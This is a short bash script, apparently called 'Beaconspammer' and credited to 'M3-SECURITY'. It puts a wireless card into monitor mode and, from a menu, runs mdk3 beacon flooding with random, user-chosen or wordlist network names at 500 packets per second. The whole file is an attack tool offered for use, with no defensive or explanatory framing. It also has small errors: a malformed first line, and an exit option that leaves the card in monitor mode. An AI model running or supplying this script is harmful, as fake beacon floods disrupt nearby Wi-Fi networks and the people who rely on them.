/#!/bin/bash
clear
echo "╔╗ ┌─┐┌─┐┌─┐┌─┐┌┐┌┌─┐┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐";
echo "╠╩╗├┤ ├─┤│  │ ││││└─┐├─┘├─┤││││││├┤ ├┬┘";
echo "╚═╝└─┘┴ ┴└─┘└─┘┘└┘└─┘┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─";
echo "				  M3-SECURITY"
echo ""
echo "Enter interface name"
read interface
clear
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up

trap ctrl_c INT

function ctrl_c() {
        clear
	echo "EXITING"
	ifconfig $interface down
	iwconfig $interface mode managed
	ifconfig $interface up
	exit
}
PS3=''
options=("Random" "Own name" "Wordlist" "Exit")
select opt in "${options[@]}"
do
    case $opt in
        "Random")
	    clear
            mdk3 $interface b -s 500
            ;;
        "Own name")
            clear
            echo "Enter own name"
            read name
	    clear
	    mdk3 $interface b -n $name -s 500
            ;;
        "Wordlist")
            clear
	    echo "Enter path to wordlist"
	    read path
	    mdk3 $interface b -f $path -s 500
            ;;
	"Exit")
            clear
	    ifconfig $interface down
	    iwconfig $interface mode monitor
	    ifconfig $interface up
	    echo "Exiting"
	    exit
            ;;

        *) echo "invalid option $REPLY";;
    esac
done
